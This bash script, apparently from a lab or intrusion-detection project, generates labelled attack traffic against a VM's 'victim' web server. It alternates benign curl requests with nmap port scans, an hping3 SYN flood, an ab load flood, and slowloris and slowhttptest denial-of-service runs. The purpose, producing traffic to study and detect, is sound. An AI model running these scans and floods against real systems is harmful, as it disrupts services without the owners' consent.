#!/usr/bin/env bash
# Runs inside the Ubuntu VM (the ONLY project file that lives in the VM). Use ONLY against your own lab host.
#   sudo ./vm_attacks.sh HOST_IP clean            # recommended evidence run (repeats each attack twice)
#   sudo ./vm_attacks.sh HOST_IP all              # one of everything
#   sudo ./vm_attacks.sh HOST_IP benign portscan dos_syn
# Phases: benign portscan portscan_connect dos_syn dos_ab dos_slowloris dos_slowhttp
HOST="$1"; shift
PORT=8000
[ -z "$HOST" ] && { echo "usage: sudo $0 HOST_IP clean|all|phase..."; exit 1; }
PHASES="$*"
case "$PHASES" in
  clean|"") PHASES="benign portscan benign portscan benign dos_syn benign dos_syn benign dos_slowhttp benign dos_slowhttp benign" ;;
  all)      PHASES="benign portscan benign dos_syn benign dos_ab benign dos_slowloris benign dos_slowhttp benign" ;;
esac
URL="http://$HOST:$PORT"; LOG=/tmp/vm_attacks.log; : > "$LOG"

# ---- make sure the tools exist (they used to fail silently) ----
missing=0
for t in curl nmap hping3 ab slowhttptest; do
  command -v "$t" >/dev/null || { echo "MISSING tool: $t"; missing=1; }
done
if ! command -v slowloris >/dev/null && ! python3 -c "import slowloris" 2>/dev/null; then echo "MISSING tool: slowloris (pip3 install slowloris --break-system-packages)"; fi
[ $missing = 1 ] && echo "install with: sudo apt install -y nmap hping3 curl apache2-utils slowhttptest"
curl -s -m 3 -o /dev/null "$URL/" || { echo "Cannot reach victim at $URL - is victim_server.py running and the firewall rule added?"; exit 1; }

mark() { curl -s -m 3 -o /dev/null "$URL/mark?phase=$1&state=$2"; }

benign() {
  end=$((SECONDS+40))
  while [ $SECONDS -lt $end ]; do
    curl -s -o /dev/null "$URL/"; curl -s -o /dev/null "$URL/big"
    curl -s -o /dev/null "$URL/slow"; curl -s -o /dev/null -d "a=1" "$URL/form"
    sleep 0.5
  done
}
portscan()         { nmap -sS -p 1-3000 -T4 -n "$HOST" >>"$LOG" 2>&1; }
portscan_connect() { nmap -sT -p 1-1500 -T4 -n "$HOST" >>"$LOG" 2>&1; }
dos_syn()          { timeout 20 hping3 -S -p $PORT -i u5000 "$HOST" >>"$LOG" 2>&1; }
dos_ab()           { ab -q -n 4000 -c 50 "$URL/" >>"$LOG" 2>&1; }
dos_slowloris()    { if command -v slowloris >/dev/null; then timeout 30 slowloris "$HOST" -p $PORT -s 50 >>"$LOG" 2>&1
                     else timeout 30 python3 -m slowloris "$HOST" -p $PORT -s 50 >>"$LOG" 2>&1; fi; }
dos_slowhttp()     { timeout 40 slowhttptest -c 200 -H -i 10 -r 50 -t GET -u "$URL/" -x 24 -p 3 -l 25 >>"$LOG" 2>&1; }

n=0
for p in $PHASES; do
  n=$((n+1))
  if ! declare -F "$p" >/dev/null; then echo "skip unknown phase $p"; continue; fi
  label="${p}_$n"; t0=$SECONDS
  echo ">> $label"; mark "$label" start; "$p"; mark "$label" end
  dur=$((SECONDS-t0))
  case "$p" in benign) ;; *) [ $dur -lt 3 ] && echo "   WARNING: $label ended after ${dur}s - the tool probably failed, see $LOG" ;; esac
  sleep 8                                   # quiet gap so phase windows never overlap
done
echo "done (tool output in $LOG)"